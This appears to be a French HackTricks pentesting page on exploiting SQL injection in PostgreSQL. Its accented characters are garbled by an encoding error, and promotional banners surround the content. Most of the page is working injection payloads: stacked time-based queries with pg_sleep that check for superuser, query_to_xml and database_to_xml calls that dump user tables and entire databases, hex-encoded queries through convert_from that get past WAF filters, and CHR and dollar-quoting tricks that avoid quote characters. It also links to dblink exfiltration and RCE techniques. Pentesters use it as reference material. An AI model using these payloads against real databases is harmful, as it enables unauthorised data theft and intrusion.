# Injection PostgreSQL

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'impossible - **nous recrutons !** (_ma√Ætrise du polonais √©crit et parl√© requise_).

{% embed url="https://www.stmcyber.com/careers" %}

***

**Cette page vise √† expliquer diff√©rentes astuces qui pourraient vous aider √† exploiter une injection SQL trouv√©e dans une base de donn√©es PostgreSQL et √† compl√©ter les astuces que vous pouvez trouver sur** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

## Interaction r√©seau - √âl√©vation de privil√®ges, Scanner de ports, divulgation de la r√©ponse au d√©fi NTLM et Exfiltration

Le module **PostgreSQL `dblink`** offre des capacit√©s pour se connecter √† d'autres instances PostgreSQL et ex√©cuter des connexions TCP. Ces fonctionnalit√©s, combin√©es √† la fonctionnalit√© `COPY FROM`, permettent des actions telles que l'√©l√©vation de privil√®ges, le balayage de ports et la capture de la r√©ponse au d√©fi NTLM. Pour des m√©thodes d√©taill√©es sur l'ex√©cution de ces attaques, consultez comment [effectuer ces attaques](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md).

### **Exemple d'exfiltration utilisant dblink et de grands objets**

Vous pouvez [**lire cet exemple**](dblink-lo\_import-data-exfiltration.md) pour voir un exemple de CTF de **comment charger des donn√©es √† l'int√©rieur de grands objets et ensuite exfiltrer le contenu des grands objets √† l'int√©rieur du nom d'utilisateur** de la fonction `dblink_connect`.

## Attaques PostgreSQL : Lecture/√©criture, RCE, √©l√©vation de privil√®ges

Consultez comment compromettre l'h√¥te et escalader les privil√®ges √† partir de PostgreSQL dans :

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## Contournement de WAF

### Fonctions de cha√Ænes PostgreSQL

La manipulation de cha√Ænes pourrait vous aider √† **contourner les WAF ou d'autres restrictions**.\
[**Sur cette page** ](https://www.postgresqltutorial.com/postgresql-string-functions/)**vous pouvez trouver quelques fonctions de cha√Ænes utiles.**

### Requ√™tes empil√©es

N'oubliez pas que PostgreSQL prend en charge les requ√™tes empil√©es, mais plusieurs applications renverront une erreur si 2 r√©ponses sont renvoy√©es alors qu'une seule est attendue. Cependant, vous pouvez toujours abuser des requ√™tes empil√©es via une injection de temps :
```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```
### Astuces XML

**query\_to\_xml**

Cette fonction renverra toutes les donn√©es au format XML dans un seul fichier. C'est id√©al si vous souhaitez d√©verser beaucoup de donn√©es en une seule ligne :
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```
**database\_to\_xml**

Cette fonction va exporter l'int√©gralit√© de la base de donn√©es au format XML en une seule ligne (soyez prudent si la base de donn√©es est tr√®s volumineuse car vous pourriez la mettre en panne ou m√™me votre propre client):
```sql
SELECT database_to_xml(true,true,'');
```
### Cha√Ænes en hexad√©cimal

Si vous pouvez ex√©cuter des **requ√™tes** en les passant **√† l'int√©rieur d'une cha√Æne** (par exemple en utilisant la fonction **`query_to_xml`**), **vous pouvez utiliser la fonction convert\_from pour passer la cha√Æne en hexad√©cimal et contourner les filtres de cette mani√®re :**

{% code overflow="wrap" %}
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
{% endcode %}

### Guillemets interdits

Si vous ne pouvez pas utiliser de guillemets pour votre charge utile, vous pouvez contourner cela avec `CHR` pour les clauses de base (_la concat√©nation de caract√®res ne fonctionne que pour les requ√™tes de base telles que SELECT, INSERT, DELETE, etc. Cela ne fonctionne pas pour toutes les instructions SQL_):
```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```
Ou avec `$`. Ces requ√™tes retournent les m√™mes r√©sultats :
```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```
<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'impiratable - **nous recrutons !** (_ma√Ætrise du polonais √©crit et parl√© requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
